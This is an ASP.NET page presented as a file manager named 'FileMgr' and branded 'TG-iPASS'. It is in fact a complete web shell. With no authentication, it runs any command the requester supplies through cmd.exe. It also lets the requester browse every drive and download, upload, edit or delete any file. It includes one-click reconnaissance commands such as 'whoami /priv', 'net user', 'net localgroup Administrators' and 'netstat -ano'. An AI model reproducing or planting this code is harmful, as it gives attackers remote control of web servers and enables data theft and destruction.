<%@ Page Language="C#" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    string GetPath() {
        string p = Request["p"];
        if(string.IsNullOrEmpty(p)) p = "E:\\";
        try { p = Path.GetFullPath(p); } catch { p = "E:\\"; }
        return p;
    }
    string Run(string cmd) {
        try {
            ProcessStartInfo psi = new ProcessStartInfo("cmd.exe", "/c " + cmd);
            psi.RedirectStandardOutput = true; psi.RedirectStandardError = true;
            psi.UseShellExecute = false; psi.CreateNoWindow = true;
            Process proc = Process.Start(psi);
            string o = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
            proc.WaitForExit(15000);
            return o;
        } catch (Exception ex) { return "ERR: " + ex.Message; }
    }
    string Enc(string s) { return System.Web.HttpUtility.HtmlEncode(s); }
    string UrlEnc(string s) { return System.Web.HttpUtility.UrlEncode(s); }
    string HumanSize(long b) {
        string[] u = {"B","KB","MB","GB","TB"};
        double s = b; int i = 0;
        while (s >= 1024 && i < u.Length - 1) { s /= 1024; i++; }
        return Math.Round(s,2).ToString() + " " + u[i];
    }
    protected void Page_Load(object sender, EventArgs e) {
        string action = Request["a"] ?? "";
        string curPath = GetPath();
        if (action == "dl") {
            string fp = Request["f"] ?? "";
            if (File.Exists(fp)) {
                Response.ContentType = "application/octet-stream";
                Response.AddHeader("Content-Disposition","attachment; filename=\""+Path.GetFileName(fp)+"\"");
                Response.TransmitFile(fp); Response.End();
            }
            return;
        }
        if (action == "del") {
            string fp = Request["f"] ?? "";
            try { if(File.Exists(fp)) File.Delete(fp); else if(Directory.Exists(fp)) Directory.Delete(fp,true); } catch {}
            Response.Redirect("?p="+UrlEnc(curPath)); return;
        }
        if (Request.HttpMethod == "POST" && action == "up") {
            foreach (string k in Request.Files) {
                HttpPostedFile f = Request.Files[k];
                if (f != null && f.ContentLength > 0) {
                    string dest = Path.Combine(curPath, Path.GetFileName(f.FileName));
                    f.SaveAs(dest);
                }
            }
            Response.Redirect("?p="+UrlEnc(curPath)); return;
        }
        if (action == "mkdir") {
            string nd = Request["nd"] ?? "";
            if (!string.IsNullOrEmpty(nd)) try { Directory.CreateDirectory(Path.Combine(curPath,nd)); } catch {}
            Response.Redirect("?p="+UrlEnc(curPath)); return;
        }
        string cmdOut = "";
        if (action == "cmd") { string c = Request["c"] ?? ""; if(!string.IsNullOrEmpty(c)) cmdOut = Run(c); }
        string editContent = "", editFile = "";
        if (action == "edit") { editFile = Request["f"]??""; try{editContent=File.ReadAllText(editFile);}catch(Exception ex){editContent="ERR:"+ex.Message;} }
        if (action == "save") { editFile = Request["f"]??""; string txt=Request.Form["txt"]??""; try{File.WriteAllText(editFile,txt);editContent=txt;}catch(Exception ex){editContent="ERR:"+ex.Message;} }
        List<DirectoryInfo> dirs = new List<DirectoryInfo>();
        List<FileInfo> files = new List<FileInfo>();
        string listErr = "";
        try { DirectoryInfo di = new DirectoryInfo(curPath); dirs=new List<DirectoryInfo>(di.GetDirectories()); dirs.Sort((a,b)=>string.Compare(a.Name,b.Name)); files=new List<FileInfo>(di.GetFiles()); files.Sort((a,b)=>string.Compare(a.Name,b.Name)); } catch(Exception ex){listErr=ex.Message;}
        string parent = "";
        try { DirectoryInfo dp = Directory.GetParent(curPath); if(dp!=null) parent=dp.FullName; } catch {}
%>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>FileMgr</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
body{margin:0;padding:0;background:rgb(15,17,23);color:rgb(201,209,217);font-family:Arial,sans-serif;font-size:13px;}
a{color:rgb(116,192,252);text-decoration:none;}
a:hover{text-decoration:underline;}
.hdr{background:rgb(26,29,39);border-bottom:1px solid rgb(42,45,62);padding:10px 20px;display:flex;align-items:center;gap:16px;flex-wrap:wrap;}
.logo{font-size:15px;font-weight:700;color:white;}
.logo b{color:rgb(92,124,250);}
.bc{display:flex;align-items:center;gap:4px;flex-wrap:wrap;font-size:12px;color:rgb(107,114,128);}
.bc a{color:rgb(116,192,252);}
.wrap{display:flex;height:calc(100vh - 49px);}
.sb{width:200px;min-width:200px;background:rgb(26,29,39);border-right:1px solid rgb(42,45,62);padding:14px;overflow-y:auto;}
.sb h4{font-size:10px;text-transform:uppercase;letter-spacing:1px;color:rgb(107,114,128);margin-bottom:8px;margin-top:14px;}
.sb h4:first-child{margin-top:0;}
.main{flex:1;overflow:auto;}
.tabs{display:flex;background:rgb(26,29,39);border-bottom:1px solid rgb(42,45,62);}
.tabs a{padding:10px 18px;font-size:12px;color:rgb(107,114,128);border-bottom:2px solid transparent;margin-bottom:-1px;}
.tabs a.on,.tabs a:hover{color:white;border-bottom-color:rgb(92,124,250);}
.tb{display:flex;gap:8px;align-items:center;padding:10px 14px;background:rgb(26,29,39);border-bottom:1px solid rgb(42,45,62);flex-wrap:wrap;}
.btn{display:inline-flex;align-items:center;gap:4px;padding:5px 11px;border-radius:5px;border:1px solid rgb(42,45,62);background:rgb(31,34,53);color:rgb(201,209,217);cursor:pointer;font-size:12px;}
.btn:hover{background:rgb(38,42,63);border-color:rgb(92,124,250);}
.btn.pri{background:rgb(92,124,250);border-color:rgb(92,124,250);color:white;}
input[type=text],input[type=file]{background:rgb(15,17,23);border:1px solid rgb(42,45,62);color:rgb(201,209,217);border-radius:4px;padding:4px 8px;font-size:12px;}
table{width:100%;border-collapse:collapse;}
thead tr{background:rgb(26,29,39);}
th{padding:7px 12px;text-align:left;font-size:10px;text-transform:uppercase;letter-spacing:.7px;color:rgb(107,114,128);border-bottom:2px solid rgb(42,45,62);}
tbody tr{border-bottom:1px solid rgb(42,45,62);}
tbody tr:hover{background:rgb(38,42,63);}
td{padding:6px 12px;vertical-align:middle;}
.sz,.dt{color:rgb(107,114,128);font-size:11px;}
.act a{margin-right:8px;font-size:11px;}
.dl{color:rgb(64,192,87);}
.ed{color:rgb(250,176,5);}
.del{color:rgb(250,82,82);}
.bdir{display:inline-block;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:600;background:rgb(26,58,92);color:rgb(116,192,252);}
.bfile{display:inline-block;padding:1px 7px;border-radius:20px;font-size:10px;font-weight:600;background:rgb(26,46,30);color:rgb(64,192,87);}
.term{background:rgb(5,8,16);border:1px solid rgb(42,45,62);border-radius:5px;padding:12px;font-family:monospace;font-size:12px;white-space:pre-wrap;max-height:320px;overflow-y:auto;color:rgb(168,255,120);}
textarea.code{font-family:monospace;font-size:12px;width:100%;height:420px;background:rgb(5,8,16);color:rgb(168,255,120);border:1px solid rgb(42,45,62);}
.pbox{background:rgb(26,29,39);border:1px solid rgb(42,45,62);border-radius:7px;padding:15px;margin:14px;}
.ptitle{font-size:13px;font-weight:600;color:white;margin-bottom:12px;}
.igrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(180px,1fr));gap:8px;}
.icard{background:rgb(31,34,53);border-radius:5px;padding:9px 12px;border:1px solid rgb(42,45,62);}
.icard .lbl{font-size:10px;color:rgb(107,114,128);text-transform:uppercase;}
.icard .val{font-size:13px;font-weight:600;color:white;margin-top:2px;}
.dbar{height:7px;border-radius:3px;background:rgb(42,45,62);margin-top:5px;overflow:hidden;}
.dfill{height:100%;border-radius:3px;background:rgb(92,124,250);}
.qcmds{display:flex;gap:5px;flex-wrap:wrap;margin-bottom:10px;}
</style>
</head>
<body>
<div class="hdr">
  <div class="logo"><b>FM</b> / TG-iPASS</div>
  <div class="bc">
  <%
    string[] pts = curPath.Replace('/','\\').Split(new char[]{'\\'},StringSplitOptions.RemoveEmptyEntries);
    string acc2 = "";
    for(int pi=0;pi<pts.Length;pi++){
      if(pi==0) acc2=pts[pi]+"\\"; else acc2=acc2+"\\"+pts[pi];
      if(pi<pts.Length-1){%><a href="?p=<%=UrlEnc(acc2)%>"><%=Enc(pts[pi])%></a> <span>/</span> <%}
      else{%><strong style="color:white"><%=Enc(pts[pi])%></strong><%}
    }
  %>
  </div>
  <div style="margin-left:auto;color:rgb(107,114,128);font-size:11px">as: <%=Enc(System.Security.Principal.WindowsIdentity.GetCurrent().Name)%></div>
</div>
<div class="wrap">
<div class="sb">
  <h4>Quick Nav</h4>
  <% foreach(var qd in new string[]{"C:\\","D:\\","E:\\","C:\\Windows\\Temp","C:\\inetpub\\wwwroot","C:\\Users"}){ try{ if(Directory.Exists(qd)){%>
  <div style="margin-bottom:5px"><a href="?p=<%=UrlEnc(qd)%>">+ <%=Enc(qd)%></a></div>
  <%}}catch{}}%>
  <h4>Drives</h4>
  <% foreach(DriveInfo drv in DriveInfo.GetDrives()){ try{ double pct=drv.TotalSize>0?(double)(drv.TotalSize-drv.AvailableFreeSpace)/drv.TotalSize*100:0; %>
  <div style="margin-bottom:9px">
    <a href="?p=<%=UrlEnc(drv.RootDirectory.FullName)%>"><%=Enc(drv.Name)%></a>
    <div class="sz"><%=HumanSize(drv.TotalSize-drv.AvailableFreeSpace)%> / <%=HumanSize(drv.TotalSize)%></div>
    <div class="dbar"><div class="dfill" style="width:<%=(int)pct%>%"></div></div>
  </div>
  <%}catch{}}%>
</div>
<div class="main">
<div class="tabs">
  <a href="?p=<%=UrlEnc(curPath)%>" class="<%=(action==""||action=="up"||action=="del"||action=="mkdir")?"on":""%>">[F] Files</a>
  <a href="?a=cmd&p=<%=UrlEnc(curPath)%>" class="<%=(action=="cmd")?"on":""%>">[T] Terminal</a>
  <%if(action=="edit"||action=="save"){%><a href="#" class="on">[E] Editor</a><%}%>
</div>

<%if(action==""||action=="up"||action=="del"||action=="mkdir"){%>
<div class="tb">
  <%if(!string.IsNullOrEmpty(parent)){%><a href="?p=<%=UrlEnc(parent)%>" class="btn">^ Up</a><%}%>
  <form method="post" action="?a=up&p=<%=UrlEnc(curPath)%>" enctype="multipart/form-data" style="display:flex;gap:6px;align-items:center">
    <input type="file" name="f" multiple>
    <button type="submit" class="btn pri">Upload</button>
  </form>
  <form method="get" style="display:flex;gap:6px;align-items:center">
    <input type="hidden" name="a" value="mkdir">
    <input type="hidden" name="p" value="<%=Enc(curPath)%>">
    <input type="text" name="nd" placeholder="New folder" style="width:130px">
    <button type="submit" class="btn">+ Dir</button>
  </form>
</div>
<%if(!string.IsNullOrEmpty(listErr)){%><div style="padding:12px 14px;color:rgb(250,82,82)">ERROR: <%=Enc(listErr)%></div><%}%>
<table>
<thead><tr><th></th><th>Name</th><th>Type</th><th>Size</th><th>Modified</th><th>Actions</th></tr></thead>
<tbody>
<%if(!string.IsNullOrEmpty(parent)){%>
<tr><td></td><td><a href="?p=<%=UrlEnc(parent)%>">[..]</a></td><td></td><td></td><td></td><td></td></tr>
<%}%>
<%foreach(DirectoryInfo d in dirs){%>
<tr>
  <td style="width:24px;text-align:center">[D]</td>
  <td><a href="?p=<%=UrlEnc(d.FullName)%>"><%=Enc(d.Name)%></a></td>
  <td><span class="bdir">DIR</span></td>
  <td class="sz">-</td>
  <td class="dt"><%=d.LastWriteTime.ToString("yyyy-MM-dd HH:mm")%></td>
  <td class="act"><a href="?a=del&f=<%=UrlEnc(d.FullName)%>&p=<%=UrlEnc(curPath)%>" class="del" onclick="return confirm('Delete?')">Del</a></td>
</tr>
<%}%>
<%foreach(FileInfo fi in files){%>
<tr>
  <td style="width:24px;text-align:center">[F]</td>
  <td><%=Enc(fi.Name)%></td>
  <td><span class="bfile"><%=Enc(fi.Extension.TrimStart('.').ToUpper())%></span></td>
  <td class="sz"><%=HumanSize(fi.Length)%></td>
  <td class="dt"><%=fi.LastWriteTime.ToString("yyyy-MM-dd HH:mm")%></td>
  <td class="act">
    <a href="?a=dl&f=<%=UrlEnc(fi.FullName)%>&p=<%=UrlEnc(curPath)%>" class="dl">Dl</a>
    <a href="?a=edit&f=<%=UrlEnc(fi.FullName)%>&p=<%=UrlEnc(curPath)%>" class="ed">Edit</a>
    <a href="?a=del&f=<%=UrlEnc(fi.FullName)%>&p=<%=UrlEnc(curPath)%>" class="del" onclick="return confirm('Delete?')">Del</a>
  </td>
</tr>
<%}%>
<%if(dirs.Count==0&&files.Count==0&&string.IsNullOrEmpty(listErr)){%>
<tr><td colspan="6" style="text-align:center;padding:40px;color:rgb(107,114,128)">(empty)</td></tr>
<%}%>
</tbody>
</table>
<div style="padding:8px 14px;color:rgb(107,114,128);font-size:11px"><%=dirs.Count%> dir(s), <%=files.Count%> file(s)</div>
<%}%>

<%if(action=="cmd"){%>
<div class="pbox">
  <div class="ptitle">[T] Terminal</div>
  <form method="get" style="display:flex;gap:8px;margin-bottom:12px">
    <input type="hidden" name="a" value="cmd">
    <input type="hidden" name="p" value="<%=Enc(curPath)%>">
    <input type="text" name="c" value="<%=Enc(Request["c"]??"")%>" placeholder="command..." style="flex:1;font-family:monospace" autofocus autocomplete="off">
    <button type="submit" class="btn pri">Run</button>
  </form>
  <div class="qcmds">
  <% string[] qcmds = {"whoami","whoami /priv","net user","net localgroup Administrators","ipconfig /all","systeminfo","tasklist /v","netstat -ano","dir "+curPath}; %>
  <%foreach(string qc in qcmds){%><a href="?a=cmd&c=<%=UrlEnc(qc)%>&p=<%=UrlEnc(curPath)%>" class="btn" style="font-size:11px"><%=Enc(qc)%></a><%}%>
  </div>
  <%if(!string.IsNullOrEmpty(cmdOut)){%>
  <div class="term"><%=Enc(cmdOut)%></div>
  <%}else{%><div class="term" style="color:rgb(107,114,128)">&gt; ready</div><%}%>
</div>
<div class="pbox">
  <div class="ptitle">System Info</div>
  <div class="igrid">
    <%
    string[,] si = {
      {"Host", Run("hostname").Trim()},
      {"User", System.Security.Principal.WindowsIdentity.GetCurrent().Name},
      {"OS",   Run("wmic os get Caption /value 2>&1").Replace("Caption=","").Trim()},
      {"Arch", System.Environment.Is64BitProcess?"x64 process":"x86 process"},
      {".NET", System.Environment.Version.ToString()},
      {"Temp", Path.GetTempPath()}
    };
    for(int si2=0;si2<si.GetLength(0);si2++){%>
    <div class="icard"><div class="lbl"><%=Enc(si[si2,0])%></div><div class="val"><%=Enc(si[si2,1].Length>40?si[si2,1].Substring(0,40)+"...":si[si2,1])%></div></div>
    <%}%>
  </div>
</div>
<%}%>

<%if(action=="edit"||action=="save"){%>
<div class="pbox">
  <div class="ptitle">Editing: <%=Enc(editFile)%></div>
  <form method="post" action="?a=save&f=<%=UrlEnc(editFile)%>&p=<%=UrlEnc(curPath)%>">
    <div style="display:flex;gap:8px;margin-bottom:9px">
      <button type="submit" class="btn pri">Save</button>
      <a href="?p=<%=UrlEnc(curPath)%>" class="btn">Back</a>
    </div>
    <textarea name="txt" class="code"><%=Enc(editContent)%></textarea>
    <div style="margin-top:8px"><button type="submit" class="btn pri">Save</button></div>
  </form>
</div>
<%}%>

</div>
</div>
<script>
document.querySelectorAll('a.del').forEach(function(a){
  a.addEventListener('click',function(e){ if(!confirm('Are you sure?')) e.preventDefault(); });
});
</script>
</body>
</html>
<%}%>
